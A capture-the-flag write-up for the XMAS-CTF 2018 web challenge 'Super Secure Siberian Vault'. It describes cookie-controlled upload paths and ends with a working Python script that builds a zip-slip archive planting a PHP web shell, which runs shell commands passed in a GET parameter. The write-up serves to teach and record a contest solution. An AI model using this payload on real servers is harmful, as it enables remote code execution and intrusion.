# __XMAS-CTF 2018__ 
## _Super Secure Siberian Vault_

## Information
**Category:** | **Writeup Author**
--- | ---
Web | Huascar Tejeda <<htejeda@f2tc.com>>

**Description:** 

> Ever wondered where Santa might keep his most personal secrets? In the most securized Siberian vault of course! Today, the concrete and steel facility has opened to the public, and you can now use it to safeguard your very own personal secrets too, just like Santa!
>
> **Pro Tip: You can upload archives to store multiple secrets at the same time.**
>
>Server: 199.247.6.180:12007
> [chall](chall)
>
> Author: Milkdrop

**Flag:**

> X-MAS{Z1pp3r_D0wn_S4nt4!_Y0ur_Secr3t5_4r3_n0w_0ur5}

## Solution

![](/images/XMAS-CTF-2018/Web/SuperSecureSiberianVault/01.png)

```
SuperSecureSiberianVault ❯❯❯ curl -I http://199.247.6.180:12007/
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 24 Dec 2018 14:38:34 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.2.10
Set-Cookie: PHPSESSID=25d1759f5000fb2ff54f55d3b5a2d428; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-XSS-Protection: 1; mode=block
```

This website allows you to upload files to /uploads/**PHPSESSID**/:
![](/images/XMAS-CTF-2018/Web/SuperSecureSiberianVault/02.png)

I started playing with the PHPSESSID cookie to see how far I could go.
 - I could manipulate the destination folder
 
 ![](/images/XMAS-CTF-2018/Web/SuperSecureSiberianVault/03.png)
 ![](/images/XMAS-CTF-2018/Web/SuperSecureSiberianVault/04.png)

 - Path traversal attack by manipulating the PHPSESSID cookie didn't work as I expected.
 - I started uploading different file types but when accessed inside the /uploads/* folder, the response Content-Type is always application/octet-stream.

   Now... remember the **"Pro Tip: You can upload archives to store multiple secrets at the same time."**? - The only way the webapp allows us to upload multiple files is by creating a zip file. But we need to find another destination folder where we can execute our script.

## Exploit

![](/images/XMAS-CTF-2018/Web/SuperSecureSiberianVault/06.png)

#### What if we create a zip file that extracts our script to '../../img/'?
```python
import zipfile

z_info = zipfile.ZipInfo(r"../../img/f2tc.php")
z_file = zipfile.ZipFile("f2tc.zip", mode="w")
z_file.writestr(z_info, "<?php if (!empty($_GET['hucmd'])) { echo '<pre>'. shell_exec($_GET['hucmd']) .'</pre>'; } ?>");
z_file.close()
```

![](/images/XMAS-CTF-2018/Web/SuperSecureSiberianVault/05.png)

![](/images/XMAS-CTF-2018/Web/SuperSecureSiberianVault/07.png)
